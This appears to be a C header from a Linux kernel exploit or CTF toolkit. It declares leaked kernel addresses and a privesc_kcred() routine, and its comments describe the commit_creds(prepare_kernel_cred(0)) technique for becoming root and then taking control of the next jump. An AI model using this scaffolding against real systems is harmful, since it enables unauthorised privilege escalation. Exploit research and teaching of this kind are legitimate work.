#ifndef PRIVESC_H
#define PRIVESC_H

#include <stdint.h>
#include <stddef.h>

/* ============= 1 =============
 * Privesc from kernel creds:
 *      commit_creds(prepare_kernel_cred(0));
 * */

 /* First leak the address of these 2 kernel APIs */
extern uintptr_t COMMIT_CREDS_ADDR;
extern uintptr_t PREPARE_KERNEL_CRED_ADDR;
extern uintptr_t PRIVESC_JUMP_ADDR;

/* Commit the creds 0 to become root
 * This returns a task_struct of a privileged context
 *
 * After this, we will need to provide a next jump
 *      to take control of the following move, as root
 * */ 
void privesc_kcred(void);

#endif  // PRIVESC_H
